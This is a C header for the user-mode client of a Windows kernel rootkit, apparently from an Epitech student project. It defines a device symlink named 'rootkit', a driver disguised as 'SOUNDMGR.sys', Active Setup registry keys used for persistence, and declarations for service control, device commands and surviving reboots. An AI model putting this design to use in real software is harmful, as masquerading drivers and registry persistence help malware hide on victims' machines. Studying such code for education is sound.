/*
** File 	client.h
** Author 	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		This file contains client's stuff
*/

#ifndef		CLIENT_H__
# define	CLIENT_H__

# define SIOCTL_TYPE	40000
# define IOCTL_CODE		CTL_CODE(SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
# define SYMLINK		"\\\\.\\rootkit"
# define DRIVERBIN_PATH	"C:\\myrootkit\\bin\\i386\\SOUNDMGR.sys"
# define DRIVER_NAME	"SOUNDMGR"
# define PATH_KEY		"Software\\Microsoft\\Active Setup\\Installed Components"
# define NAME_KEY1		"{232f4e3f2-bab8-11d0-97b9-00c04f98bcb9}"
# define NAME_KEY2		"{256dc5e0e-7c46-11d3-b5bf-0000f8695621}"
# define PATHSIZE_MAX	1024
# define REBOOT_OPTIONS " --stop --start --reboot on > log"

typedef void (*pCmdFunc)(char *);

typedef struct	s_command
{
	char		*cmdStr;
	pCmdFunc	execCmd;
	int			nbParams;
}				t_command;

/* client.c */
void		startService(char *params);
void		stopService(char *params);
void		restartService(char *params);
void		printUsage(char *params);

/* commands.c */
int			getNbParams(char *toFind);
char		*concatParams(char *argv[], int NbParams);
void		execCommand(char *cmd, char *params);

/* process.c */
void		sendToDevice(char *params);

/* reboot.c */
void		surviveReboot(char *params);

#endif		/*! CLIENT_H__ */
